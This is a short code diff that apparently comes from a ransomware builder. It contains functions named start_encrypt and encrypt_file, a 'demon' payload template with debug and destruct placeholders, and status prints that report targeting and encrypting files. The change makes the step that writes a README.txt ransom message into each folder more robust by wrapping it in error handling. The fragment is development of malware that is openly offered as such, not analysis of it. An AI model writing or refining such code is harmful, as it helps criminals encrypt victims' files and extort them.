@@ -71,10 +71,13 @@ def start_encrypt(p, key):
                                 <debug>
                                 pass
 
-
-                with open(path + '/README.txt', 'w') as f:
-                    f.write(message)
-                    f.close()
+                try:
+                    with open(path + '/README.txt', 'w') as f:
+                        f.write(message)
+                        f.close()
+                except Exception as e:
+                    <debug>
+                    pass
 
         <destruct>
     except Exception as e:
@@ -313,6 +316,7 @@ def encrypt_file(file_name, key):
         demon = demon.replace('<debug>', "print('[SEARCHING] Targeting %s' % target)", 1)
         demon = demon.replace('<debug>', "print('[FOUND] %s' % name)", 1)
         demon = demon.replace('<debug>', "print('[ENCRYPTED] %s' % name)", 1)
+        demon = demon.replace('<debug>', "print('[ERROR] %s' % e)", 1)
         demon = demon.replace('<debug>', "print('[ERROR] %s' % e)", 1)
         demon = demon.replace('<debug>', "print('[ERROR] %s' % e)", 1)
 
